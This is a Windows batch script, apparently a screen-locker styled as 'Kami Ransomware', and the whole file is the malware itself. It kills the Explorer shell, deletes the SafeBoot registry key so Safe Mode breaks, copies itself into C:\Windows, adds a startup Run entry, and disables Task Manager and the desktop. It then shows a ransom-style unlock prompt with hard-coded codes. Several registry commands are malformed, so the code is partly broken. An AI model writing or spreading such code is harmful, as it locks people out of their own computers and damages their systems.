@echo off 
taskkill /im explorer.exe /f > nul
reg delete HKLM\System\CurrentControlSet\Control\SafeBoot /f > nul
copy %0 C:\Windows\KamiRansomware.bat > nul 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f 
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul 
cls >nul
GOTO :INFECTED

title Kami Ransomware
:INFECTED
color 0c
echo You have been infected Kami Ransomware!
echo Now your computer infected Ransomware!
echo If you want to unblock your system access please enter code 
set /p unblock= 
if %unblock%== KAMIUNBLOCK GOTO :UNBLOCKING
if %unblock%== pleaseunblockmypc GOTO :UNBLOCKING
if %unblock%== kamiransomware2022 GOTO :UNBLOCKING

:UNBLOCKING
@echo off
explorer 
echo Now press any key to unblock your computer!
pause >nul
reg add HKLM\System\CurrentControlSet\Control\SafeBoot /f > nul
del C:\Windows\KamiRansomware.bat
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f 
reg delete HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul 
